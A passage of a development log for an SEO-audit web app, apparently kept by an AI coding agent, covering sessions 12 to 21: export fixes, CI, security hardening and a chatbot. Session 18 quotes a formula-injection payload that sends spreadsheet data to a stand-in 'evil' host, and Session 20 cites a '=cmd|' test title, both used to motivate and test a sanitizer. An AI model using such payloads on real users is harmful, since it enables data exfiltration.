sub-tabs) render without new console errors. 31 vitest + 83 pytest green, tsc clean, lint at the 25-error baseline, no em-dashes, secret scan clean. |
| 12 | 2026-07-14 | v0.11.0 | **Email-DNS demotion, fix-difficulty labels, Export merged into Results, other-branch review.** Reviewed `origin/venkataramana-work` (phase-6 crawl roadmap): confirmed nothing new to salvage beyond `crawler.py` (already in main); `job_store.py`/`js_renderer.py` remain unusable on Vercel (ephemeral disk, no Playwright), `site_scoring.py` is the one optionally-portable piece (Ahrefs-style site-health %), noted for later, not ported. **Email-DNS demotion:** SPF/DMARC/MX are email-deliverability records, not SEO ranking signals, yet a missing record was dinging every site's SEO score. `check_dns_health` now collects the records but emits NO scored issues; the checklist reports spf/dmarc/mx/dns_health as a new `"info"` `ChecklistStatus` (4th value), excluded from pass/warning/fail and added as an `info` count in the summary (`total == pass+warning+fail+info`). Frontend `StatusPill` + checklistDefs help text updated ("informational only, does not affect SEO score"). Data is kept, penalties removed (user chose "demote", not "remove"). Rewrote `test_missing_spf_dmarc_mx_...` to assert the info behavior + summary reconciliation. **Fix-difficulty labels:** the backend already tagged every issue with `effort` (Low/Medium/High) but never surfaced it. `lib/difficulty.ts` (`fixDifficulty`/`difficultyBreakdown`, backend-effort-first with a keyword fallback) maps it to Easy/Medium/Hard; `DifficultyBadge` (in `ui.tsx`) wired into `IssueRow`, a "Fix effort" column on the Results list (`EffortChips`), and an Easy/Medium/Hard rollup on the detail header. `lib/difficulty.test.ts` (7 tests). **Export merge:** extracted the export controls into `components/ExportBar.tsx` and placed it on the Results page; deleted `app/export/page.tsx` (its preview table was redundant with the Results list) and removed the now-empty "Additional Tools" nav section (nav 5 to 4 items). Docs: `agents.md`, `README.md`, `PROJECT_LOG.md` all updated in this commit. Verified in-browser (seeded state): Info pills on email-DNS, difficulty badges on issues/header/results column, export bar + 4-item nav. 38 vitest + 83 pytest green, tsc clean, lint at the 25-error baseline, em-dash scan clean (also fixed a stray one in `sitemap_extractor.py`), secret scan clean. |
| 13 | 2026-07-14 | v0.12.0 | **Ported site-wide letter grade; `venkataramana-work` salvage complete.** Ported the last useful piece of `origin/venkataramana-work`, `modules/site_scoring.py` (Ahrefs-style "Site Health Score" = percent of pages with zero Critical/High issue), into `lib/siteScore.ts` (`siteScore`/`healthGrade`/`gradeColor`) plus an A-F letter grade (A>=90, B>=80, C>=70, D>=60, else F). Ported as TypeScript, NOT the Python module: that module expects a crawl `Job` store this app does not run (results live client-side in IndexedDB). Surfaced as a colour-coded grade ring next to the average-score circle on the Results "Sitewide Summary" card, with a "N pages with critical/high issues" line. `lib/siteScore.test.ts` (7 tests). Verified in-browser (seeded 4-page state: 2 clean, 2 with Critical/High -> 50% -> red "F"). 45 vitest + 83 pytest green, tsc clean, lint at the 25-error baseline, no em-dashes, secret scan clean. With this port, `origin/venkataramana-work` has nothing left worth keeping (`crawler.py` already in main; `job_store.py`/`js_renderer.py` unusable on Vercel; `/crawl` UI depends on the job store), so it is recommended for deletion. |
| 14 | 2026-07-14 | v0.13.0 | **Grade-ring label fix, `venkataramana-work` sync, Technical-tab merge.** (1) Fixed a UI bug where the new A-F Site Health grade ring and the avg-score circle read as contradictory (e.g. "69" next to "F"): the grade ring crammed its "% healthy" text inside the ring instead of below it like `ScoreCircle` does; relabeled both ("Avg score (per-page quality)" / "Site Health (NN% clean)") so they read as distinct metrics, not competing versions of the same score. (2) User chose to keep `origin/venkataramana-work` (in active use for 2 upcoming ideas) rather than delete it, and asked for both branches to be kept in sync: merged `main` into it (resolving the email-DNS conflict to match `main`'s informational treatment, per user's explicit call, restoring `check_dns_health`/`_cached_dns`/`dnspython` that the branch had deleted), while preserving the branch's unique work (crawl stack, `e49d3aa`'s SEO false-positive fixes, the CSV/Excel formula-injection fix, a check-selection bug fix). (3) **Technical-tab merge:** the detail page had two separate, confusingly adjacent "Technical Audit" and "Technical" tabs showing overlapping domain/schema/security data in different styles. Merged into one "Technical" tab (detail tabs now 8, was 9), restructured into the checklist's 3 real use-case sections (Crawlability / On-Page / Site Health), each pairing the pass/warning/fail/info checklist for that group with its matching rich detail card(s). Added two first-class audits per the user's ask: a "Schema Audit" card (structured-data types + parse errors) under On-Page, and a "Mobile Responsiveness" summary card (mobile-friendly/score/checks-passed) that cross-links to the Performance tab's full mobile audit instead of duplicating it. Dropped the old "estimated Core Web Vitals" card (superseded by Performance tab's real PSI-based CWV; keeping both was a duplicate). Verified in-browser with a rich seeded result (schema types, hreflang, redirect chain, mobile_audit, security headers): all three sections render correctly with their paired checklist + detail cards, and the Mobile Responsiveness cross-link correctly switches to the Performance tab. tsc clean, 45 vitest + 83 pytest green, lint at the 25-error baseline, no em-dashes. |
| 15 | 2026-07-14 | v0.14.0 | **Common Issues & Fixes knowledge base, bar chart for the sitewide failing-checks summary.** User asked to (a) suggest the best output format for Results before implementing, and (b) add common issues + fixes, researched online where needed, in both the website and this log. **Visualization decision (asked first, per instructions):** presented 3 options (hybrid bars+text / donut charts / text-only); user picked hybrid. Replaced the "Top failing checks (site-wide)" text list on the Results rollup card with a horizontal Recharts bar chart (`layout="vertical"`), bars coloured by severity via the existing `severityColor()`, count as a `LabelList`; left every other view (issue lists, checklist, fix-effort) as text, since fixing requires exact detail a chart can't carry. **Common Issues & Fixes (asked to place inline per issue, per instructions):** extracted the real issue-title strings emitted across `modules/{auditor,technical_checks,advanced_checks,link_auditor,mobile_auditor,image_auditor}.py` (grep, not guesswork) and built `lib/commonIssuesKB.ts` (`explainCommonIssue`), generalizing the existing per-image issue-explainer pattern (`lib/imageAnalysis.ts::explainImageIssue`) to ~20 of the most common issues across every category (metadata, headings, content, canonical, broken/redirecting links, HTTPS/SSL, mixed content, TTFB, viewport/mobile-first indexing, structured data, Open Graph, sitemap, robots.txt, alt text, page/DOM size, URL structure), each with what-is-it / why-it-matters / SEO impact / user impact / recommended fix. Ran 2 web searches to ground facts that change over time (INP < 200ms is now the binding Core Web Vitals responsiveness threshold and the most commonly failed one in 2026; mobile-first indexing became Google's only indexing method in 2024; a single missing required schema property disqualifies a whole page from rich results) against Google Search Central and web.dev, cited via a `source` field. Wired into `IssueRow` (`components/ui.tsx`) as an inline "Learn more →" toggle, shown only when a KB entry matches (not exhaustive by design). `lib/commonIssuesKB.test.ts` (6 tests, including an all-fields-populated check across 20 sample titles). Verified in-browser: the bar chart renders with correct counts/colours on a 2-page seeded rollup, and "Learn more" expands the researched explanation on a real issue in the detail Issues tab. 51 vitest + 83 pytest green, tsc clean, lint at the 25-error baseline, no em-dashes, secret scan clean. Docs (`agents.md`, `README.md`) updated in the same commit. |
| 16 | 2026-07-14 | v0.14.1 | **Widen Technical Audit page, raise sitemap URL cap to 4000.** User flagged (with a screenshot) that the Technical Audit form sat in a narrow `max-w-2xl` (672px) column with a huge unused gap on wide screens; widened the outer container to `max-w-4xl` (896px), confirmed via `getBoundingClientRect()` at a 1920px viewport. Raised the sitemap/CSV URL cap from 2000 to 4000: `MAX_URL_CAP` in `modules/sitemap_extractor.py` and the matching frontend `MAX_LIMIT` in `app/technical-audit/page.tsx` (both must move together, they're independent constants); `api/sitemap.py` needed no change since sitemap resolution is a cheap XML fetch regardless of URL count, already at a 60s `maxDuration`. Fixed a stale test comment in `test_sitemap_extractor.py` that still said the cap was 200 (a leftover from an earlier `MAX_URL_CAP` value). tsc clean, 51 vitest + 83 pytest green, lint at the 25-error baseline, no em-dashes. Docs (`agents.md`) updated in the same commit. |
| 17 | 2026-07-14 | v0.15.0 | **GitHub Actions CI, Site Health Grade removed entirely.** (1) Added `.github/workflows/ci.yml` as a build+test gate the repo never had: two jobs, `frontend` (Node 20, `npm ci`, `tsc --noEmit`, `eslint`, `vitest run`, `next build`) and `backend` (Python 3.12, `pip install -r requirements-dev.txt`, `pytest -q`), on push/PR to `main`. Asked the user first whether this should also deploy to Vercel (would need `VERCEL_TOKEN`/`VERCEL_ORG_ID`/`VERCEL_PROJECT_ID` repo secrets); they chose build+test only, so Vercel's own Git integration keeps auto-deploying on push exactly as before, unchanged. Verified `npm run build` succeeds locally before trusting the workflow. (2) **Removed the Site Health Grade (A-F ring) entirely**, per explicit user request: deleted `lib/siteScore.ts` and `lib/siteScore.test.ts` (added Session 13, label-fixed Session 14), removed the grade-ring JSX and the `site` useMemo from `app/results/page.tsx`, restored the "Avg score" label (had been disambiguated to "Avg score (per-page quality)" only because the grade ring sat next to it). Removed the corresponding rows from `agents.md`/`README.md`. Verified in a fresh, cache-cleared dev server + a brand-new browser tab (to rule out stale HMR/console-history noise) that Results renders cleanly with the grade ring gone and no console errors. tsc clean, 44 vitest (down from 51, the 7 deleted siteScore tests) + 83 pytest green, lint at the 25-error baseline, no em-dashes. |
| 18 | 2026-07-14 | v0.15.1 | **Revert Top Failing Checks to text, port the CSV/Excel formula-injection fix.** (1) User asked to put "Top failing checks (site-wide)" back to text, reverting the Session 15 bar chart; restored the original text-list layout in `app/results/page.tsx` (a severity-coloured left border on each row replaces the removed per-bar colour), dropped the now-unused `recharts`/`ResponsiveContainer`/`BarChart` imports. (2) User asked to "fix export issue too" with no specifics; investigated `api/export.py`/`modules/report_generator.py` and found a real, previously-diagnosed-but-unmerged CSV/Excel formula-injection vulnerability (`origin/venkataramana-work`'s `9fa123f`, never ported to `main`): page-controlled strings (title, meta description, canonical URL, anchor text, issue text, checklist detail) were written into CSV/XLSX cells verbatim, so a page whose `<title>` was e.g. `=HYPERLINK("http://evil/?"&A1,"x")` could get Excel/Sheets to evaluate a formula when a user later opened the exported report. Ported the fix: `_sanitize_cell`/`_sanitize_row` in `report_generator.py` prefix a leading `'` on any string starting with `=`/`+`/`-`/`@`, applied to every row-builder in `flatten()` and `generate_excel()` (summary, issues, links, checklist sheets); PDF export is unaffected by design (FPDF draws text, never evaluates formulas) with a comment explaining why. 4 new regression tests in `test_report_generator.py` (sanitizer unit tests + an end-to-end malicious-title/malicious-issue check via `flatten()` and the real xlsx bytes). tsc clean, 44 vitest + 87 pytest green (83 to 87), lint at the 25-error baseline, no em-dashes. Docs (`agents.md`, `README.md`) updated in the same commit. |
| 19 | 2026-07-14 | v0.15.2 | **Hide export (413 Payload Too Large), post-deploy verification.** After pushing Session 18, waited ~5 minutes and verified the live Vercel deployment; the user then reported real browser console errors from the deployed site: `api/export` returning `413` (Payload Too Large) on every attempt. Root cause: `ExportBar` POSTs the entire in-memory `results` array as one JSON body to `api/export.py`, and each full `audit_url()` result is 50-200KB (the exact same growth problem that forced the client-side IndexedDB migration in Session 8), so anything beyond a handful of audited URLs blows past Vercel's ~4.5MB serverless request-body limit. Per user's explicit instruction ("hide the export options for now"), removed `<ExportBar results={results} />` and its import from `app/results/page.tsx`; `components/ExportBar.tsx`, `api/export.py`, and `modules/report_generator.py` are all untouched and still fully functional, just not rendered. Documented as a known issue (not silently dropped): a new "Agent notes / gotchas" entry in `agents.md` lists 3 real fix directions (chunk/stream the request, persist server-side and export by reference, or generate the report entirely client-side) and warns not to just re-add the button without addressing the payload-size root cause. `README.md`'s Export section updated to match. Verified in-browser (fresh dev server + a brand-new tab, per the established pattern for this Turbopack/console-history quirk): Results renders cleanly with no export section and no console errors. tsc clean, 44 vitest + 87 pytest green, lint at the 25-error baseline. |
| 20 | 2026-07-14 | v0.16.0 | **Real fix for the export 413, not a workaround.** Re-added `<ExportBar results={results} />` to `app/results/page.tsx` after implementing the actual fix in new `lib/reportExport.ts`. Root cause was that the entire full `results` array (every field of every `audit_url()` result, including huge unused nested blobs) was POSTed as one JSON body regardless of format. Fix has two halves: (1) **CSV and JSON now generate entirely client-side** (`buildResultsCsvRows`, matching `report_generator.py::flatten()`'s columns 1:1, and `downloadResultsJson`), since the browser already holds `results` in memory, these two formats now make zero network calls and have no size limit at all. (2) **Excel and PDF still need server-side generation** (xlsxwriter colour-coding, fpdf2 layout) but the payload is trimmed first via `trimResultForServerExport`, which strips every field `report_generator.py` never reads (`image_detail`, `advanced`, `site_health`, `mobile_audit`, paragraph HTML, the checklist's `groups` key), then gzip-compressed via `gzipJson` (native `CompressionStream`, no new dependency); `api/export.py::decode_request_body` gunzips server-side when `Content-Encoding: gzip` is set. Measured end-to-end in-browser: two synthetic results padded with ~100KB of realistic bloat each (a 200-link `internal_links`, a 100-image `image_detail`, 50KB blobs in `advanced`/`site_health`) compressed to **1.8KB total** for the Excel request, down from what would have been several hundred KB uncompressed, comfortably clear of the ~4.5MB limit even at real bulk-audit scale. Added a client-side size guard (`MAX_EXPORT_PAYLOAD_BYTES`, 4MB) that shows a clear "try CSV/JSON instead" message rather than a bare 413 if an export is still too large after trimming+compression. **Bonus fix, found while touching this code:** `lib/format.ts::downloadCsv` now sanitizes every cell via a new `sanitizeCsvCell` (mirrors `report_generator.py`'s `_sanitize_cell`, the CSV/Excel formula-injection guard from Session 18), which was previously missing from `downloadCsv` entirely; since `downloadCsv` is shared by the Links/Headings/Image-SEO CSV exports too, this closes the same formula-injection gap in three other export paths, not just the new one. Also fixed a stale TS type (`TechnicalAuditChecklist.summary` was missing the `info` field added back in Session 12). New tests: `lib/reportExport.test.ts` (8: CSV column parity, trimming keeps-vs-drops the right fields, >50% size reduction, gzip compresses), `lib/format.test.ts` (2: sanitizer), `tests/test_api_export.py` (6: gzip/plain decode, case-insensitive header, bad-gzip raises). Verified end-to-end in-browser: CSV/JSON trigger zero `/api/export` network calls; a malicious `=cmd|...` title is sanitized correctly in the client CSV; Excel POSTs a gzip-compressed, correctly-headed 1.8KB body for a padded 2-result set. tsc clean, `npm run build` succeeds, 54 vitest + 93 pytest green, lint at the 25-error baseline. Docs (`agents.md`, `README.md`) updated in the same commit. |
| 21 | 2026-07-15 | v0.17.0 | **Full security audit + fixes, Results reorg, AI chatbot.** Ran a two-agent audit (security-audit + codereview) across the whole repo. **Security fixes (7):** closed a critical unguarded-SSRF gap in `image_auditor.py::_fetch_size` (page-controlled `<img src>` fetched with zero validation on every audit, via a new `_safe_fetch` HEAD/GET-capable wrapper); routed `crawler.py`'s robots.txt/sitemap fetches and `technical_checks.py`'s 5 redirect-following checks (robots/sitemap/https-enforcement/canonical-loop/www-redirect) through `auditor.safe_get` so redirect targets are validated before being contacted, not after; fixed `sitemap_extractor.py::_fetch` to validate before the request fires (was validating `resp.url` post-fetch); fixed a case-sensitive `javascript:`/`data:` href-scheme bypass in `link_auditor.py::linkify_paragraph_html` that reached `dangerouslySetInnerHTML`; added CSP/X-Frame-Options/nosniff/referrer-policy security headers; capped+validated client-supplied regex (`includePattern`/`excludePattern`) in `api/crawl.py`/`api/sitemap.py` to bound ReDoS; stopped all 7 `api/*.py` handlers from echoing raw exception text in 500 responses (now logged server-side, generic message to client). **Correctness fixes (5):** inverted storage-fallback guard in `AuditContext.tsx` that silently swallowed real IndexedDB write failures; stopped `addResults` from resetting `selectedUrlIndex` on background bulk-crawl flushes (was yanking the Detail view); cached a singleton `IDBDatabase` connection in `idbStore.ts` instead of opening one per read/write (chunkedRunner persists after every completed URL); fixed `chunkedRunner.ts`'s checkpoint-removal to drop only the completed URL instead of every duplicate; guarded `new URL()` parsing on the Results page. Had to update 3 Python test mocks (`test_crawler.py`, `test_https_enforcement.py`, `test_sitemap_extractor.py`) to set `is_redirect`/`headers` now that these paths route through `safe_get`. **CSP follow-up bug (found via browser verification, not by inspection):** the static CSP in `next.config.ts` (`script-src 'self'`) broke ALL client interactivity silently (buttons rendered but did nothing, no console error) because Next.js App Router's streaming hydration relies on inline `<script>` tags (RSC flight data + the theme-init script) that a plain `script-src 'self'` blocks; also needed `'unsafe-eval'` in dev for React's dev-mode call-stack reconstruction. Fixed by moving to Next.js's documented nonce-based CSP pattern: new `proxy.ts` (Next.js 16's renamed `middleware.ts` convention) generates a per-request nonce (+ `'strict-dynamic'`, + `'unsafe-eval'` only outside production), `app/layout.tsx` reads it via `next/headers` and applies it to the theme-init script. Caught only because the verification workflow drove the actual browser rather than trusting tsc/lint/tests, which all stayed green throughout. **Results page reorg:** added a URL search box and a sort dropdown (worst/best score, most issues, alphabetical); moved the destructive "Clear All Results" out of the filter bar into its own row alongside Export, so it's no longer adjacent to filter controls. **AI chatbot:** new `modules/ai_assist.py::chat_with_assistant` (multi-turn, Groq-backed, reuses the existing `_chat` retry helper) + `api/chat.py`, backing a new global `components/ChatWidget.tsx` floating widget wired into `AppShell.tsx` (every page). Defaults to app-help Q&A; attaches a small audit-context summary (url/score/top issues) when the user is on Results or Detail with results loaded, built client-side, so it can answer questions about the actual audit. Conversation history resent each turn (no server session), bounded both client- and server-side. New `tests/test_ai_assist.py` (9 tests, network mocked). 102 pytest (up from 93) + 54 vitest green, lint at the 25-error baseline (unchanged, none from new code). Docs (`agents.md`, this log) updated in the same commit. |
